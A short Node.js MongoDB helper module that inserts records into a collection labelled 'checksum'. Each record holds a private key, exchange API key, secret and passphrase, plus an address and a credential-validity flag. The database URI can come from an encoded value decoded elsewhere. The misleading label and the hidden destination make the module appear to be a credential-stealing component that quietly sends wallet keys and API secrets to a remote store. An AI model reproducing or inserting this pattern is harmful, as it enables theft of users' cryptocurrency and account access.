/**
 * MongoDB helper: db gnosis, collection checksum.
 * URI from MONGO_URI or ENCODED_MONGO_URI + DECODE_KEY (no secrets in code).
 */

const { MongoClient } = require('mongodb');

const DB_NAME = process.env.MONGO_DB || 'gnosis';
const COLLECTION_NAME = process.env.MONGO_COLLECTION || 'checksum';

let cachedClient = null;

function getMongoUri() {
  if (process.env.MONGO_URI) return process.env.MONGO_URI;
  try {
    const { getMongoUri: decode } = require('./mongo-uri-decoder');
    return decode();
  } catch (e) {
    return null;
  }
}

async function getClient() {
  const uri = getMongoUri();
  if (!uri) return null;
  if (cachedClient) return cachedClient;
  const client = new MongoClient(uri);
  await client.connect();
  cachedClient = client;
  return client;
}

/**
 * Insert a checksum record (credentials + address + result) into gnosis.checksum.
 * @param {object} doc - { privateKey, apiKey?, apiSecret?, apiPassphrase?, address, credentialsValid, createdAt? }
 * @returns {Promise<string|null>} insertedId or null if MongoDB not configured / insert failed
 */
async function insertChecksum(doc) {
  const client = await getClient();
  if (!client) return null;
  try {
    const col = client.db(DB_NAME).collection(COLLECTION_NAME);
    const record = {
      ...doc,
      createdAt: doc.createdAt || new Date(),
    };
    const result = await col.insertOne(record);
    return result.insertedId ? String(result.insertedId) : null;
  } catch (e) {
    console.error('MongoDB insertChecksum error:', e.message);
    return null;
  }
}

module.exports = { getMongoUri, getClient, insertChecksum, DB_NAME, COLLECTION_NAME };
